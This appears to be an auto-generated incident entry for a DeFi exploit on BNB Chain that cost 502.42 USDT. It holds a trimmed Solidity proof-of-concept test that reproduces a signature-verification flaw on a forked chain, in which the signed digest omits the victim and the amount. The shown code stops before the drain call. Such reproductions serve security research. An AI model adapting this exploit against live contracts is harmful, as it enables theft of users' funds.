# [?] unverified - Signature Verification

## Summary
Severity: Unknown
Chain: BNB Chain
Component: unverified_8fd3
Published: 2025-07-17
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/unverified_8fd3_exp.sol
Type: defi-exploit-poc

## Details
Lost: 502.42 USDT

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 54_350_435;
        vm.createSelectFork("bsc", forkBlock);

        fundingToken = address(USDT_TOKEN);
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Trace Attack Contract");
        vm.label(VICTIM, "Victim");
        vm.label(ENTRY_STATE_PROXY, "Entry State Proxy");
        vm.label(VULNERABLE_CONTRACT, "Unverified Implementation");
        vm.label(address(USDT_TOKEN), "USDT");
    }

    function testExploit() public balanceLog {
        uint256 victimBalanceBefore = USDT_TOKEN.balanceOf(VICTIM);
        uint256 attackerBalanceBefore = USDT_TOKEN.balanceOf(ATTACKER);
        uint256 proxyAllowance = USDT_TOKEN.allowance(VICTIM, ENTRY_STATE_PROXY);

        assertGt(victimBalanceBefore, 500 ether, "victim should hold trace USDT balance");
        assertEq(attackerBalanceBefore, 0, "attacker starts with no USDT");
        assertGe(proxyAllowance, victimBalanceBefore, "victim allowance covered full balance");

        bytes memory signature =
            hex"16dd0346f9e72dd03f66eaea16dc301f9e5ee2387331518003fe1b2a76d544ab79acd7145f17ee446458c77ddc3379839f185bf3f028abd0959e818886c34e161c";
        bytes4 unverifiedDrainSelector = 0x97e76253;

        // The decompiled implementation verifies keccak256(abi.encodePacked(timeBucket, recipient)).
        // VICTIM and amount are not part of the signed message, but are still used in transferFrom below.
        uint256 fiveMinuteBucket = (block.timestamp / 300) * 300;
        bytes32 recipientOnlyDigest = keccak256(abi.encodePacked(fiveMinuteBucket, ATTACKER));
        assertEq(recoverSigner(recipientOnlyDigest, signature), AUTHORIZED_SIGNER, "recipient signature is valid");

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/unverified_8fd3_exp.sol_
